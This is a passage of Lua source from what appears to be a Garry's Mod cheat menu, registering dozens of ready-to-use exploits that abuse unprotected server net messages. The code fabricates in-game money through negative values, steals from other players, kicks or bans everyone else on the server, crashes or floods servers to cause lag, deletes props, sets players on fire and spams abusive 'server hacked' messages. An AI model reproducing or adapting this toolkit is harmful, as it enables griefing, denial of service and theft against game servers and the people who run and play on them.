net.WriteEntity(swag)
net.WriteTable({'spawned_weapon'})
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ MODIFIER TAXES €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Fine System €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Отправить всем", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam send Fine", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit на деньги, Смотрите на купленный автомобиль, чтобы дублировать его ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Дублировать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i = 0, 75 do
iZNX.NetStart( "RXCAR_Shop_Store_C2S" );
net.WriteTable( { E = ent } );
net.SendToServer();
end
end, },
{ typ = "func", name = "Продать все", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local ent
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "rm_car_dealer" then
ent = v
end
end
for k,v in pairs(RX3DCar_Inventory) do
iZNX.NetStart( "RXCAR_SellINVCar_C2S" )
net.WriteTable({UN=v.UniqueID,SE=ent})
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Remove Weapons / Money", {
desc = "Удалить оружие / деньги у всех",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Удалить оружие", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Crafting Mod €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Добавить денег", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -iZNX.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Удалить деньги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Set on FIRE", {
desc = "Подожгите пропы / игроков. RIP JOHNNY.",
severity = 3,
scan = function() return iZNX.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Поджечь пропы", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Поджечь игроков", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Change HP", {
desc = "Измените HP игроков",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Сетнуть HP", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugseffect_hpremove")
net.WriteString(iZNX.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Respawn Exploit", {
desc = "Exploit на возрождение",
severity = 2,
scan = function() return iZNX.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Телепорт", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Удалить проп 2", {
desc = "Удаление всех пропов",
severity = 2,
scan = function() return iZNX.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Kick 3", {
desc = "Exploit для кика всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Kick 2", {
desc = "Exploit для кика",
severity = 3,
scan = function() return iZNX.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Loot Items", {
desc = "Auto-Loot предметов",
severity = 2,
scan = function() return iZNX.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Лут", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs(ents.GetAll()) do
if v:GetClass() == "item_loot" then
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Kick everyone", {
desc = "Exploit для кика всх людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "kickallnoob" ) then
iZNX.ChatText( "Кик всех запущен" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do
iZNX.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
iZNX.ChatText( "Кик всех прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Kick 1", {
desc = "Exploit для кика админов",
severity = 3,
scan = function() return iZNX.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Кик", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart('plyWarning')
net.WriteEntity(v)
net.WriteString('You have to select a player before doing a action.')
net.SendToServer()
iZNX.ChatText("Попытка кикнуть ".. v:Nick().. "!")
end
end, },
},
} )
iZNX.AddExploit( "NLR Freeze", {
desc = "Exploit для заморозки всех людей",
severity = 3,
scan = function() return iZNX.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Заморозить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Delete props 1", {
desc = "Удаление всех пропов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Hack Keypads", {
desc = "w0w h4ck3r",
severity = 1,
scan = function() return iZNX.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Хакнуть", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kart System €", {
desc = "Exploit для денег.",
severity = 3,
scan = function() return iZNX.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i=1, 300 do
iZNX.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Farming Mod €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Point Shop €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Изменение скина",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Изменить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hitman X €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Bail Out €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Tow Truck €", {
desc = "Это перевести я не смог",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn МТП", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Money Exploit", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Спавн Fire Truck",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Заспавнить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hit Menu €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ HHH €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local plyhhh = LocalPlayer()
for k,v in pairs(player.GetAll()) do
dahater = v
end
if dahater != plyhhh then
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "В этой версии HHH невозможно использовать эксплойт !" )
end
end, },
},
} )
iZNX.AddExploit( "€ DaHit €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Выдать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam выдача", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "Defqon_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
{ typ = "func", name = "Spam забиранием", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "Defqon_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Наносите постоянный ущерб принтерам по близости",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer запущен" )
timer.Create( "Defqon_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Crash the Server", {
desc = "Краш сервера",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Free Ammunition", {
desc = "Дает вам боеприпасы для всего вашего оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Advanced Money Printer €", {
desc = "Своровать все деньги из принтеров",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Своровать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban everyone", {
desc = "Exploit забанит всех, кроме вас. Был найден в более старой версии gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Poutous everywhere" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #1", {
desc = "Создает лаги на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_lagsploit1" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
iZNX.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit1" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Console Spam", {
desc = "Засоряет консоль сообщениями Seized ",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Спам", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_bigspames2" ) then
iZNX.ChatText( "Запускаем спам" )
timer.Create( "Defqon_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "_u Seized by DefqonSploit xD " )
end
end)
else
timer.Remove( "Defqon_exploit_bigspames2" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #2", {
desc = "Exploit для создания лагов на сервере",
severity = 1,
scan = function() return iZNX.ValidNetString( "Keypad" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_lagsploit4" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit4", 0, 0, function()
for i = 1, 1000 do
iZNX.NetStart("Keypad")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit4" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Сделать лаги на сервере, перемещая сервер на хост Африки",
severity = 2,
scan = function() return iZNX.ValidNetString( "CreateCase" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_lagsploit5" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit5", 0.02, 0, function()
for i = 1, 300 do
iZNX.NetStart( "CreateCase" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit5" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #4", {
desc = "Exploit для создания лагов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "rprotect_terminal_settings" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_lagsploit6" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit6", 0.02, 0, function()
for i = 1, 200 do
iZNX.NetStart( "rprotect_terminal_settings" )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit6" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #5", {
desc = "Exploit для создания лагов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_lagsploit7" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit7" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Reanimation Exploit", {
desc = "Вы автоматически воскресаете после смерти",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Бессмертие", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_zombie" ) then
iZNX.ChatText( "Ты бессмертен" )
timer.Create( "Defqon_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_zombie" )
iZNX.ChatText( "Ты снова смертен!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Возьмите оружие из арсенала полиции (вы должны быть рядом с ним) кулдаун 5 минут",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Взять оружие #1", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
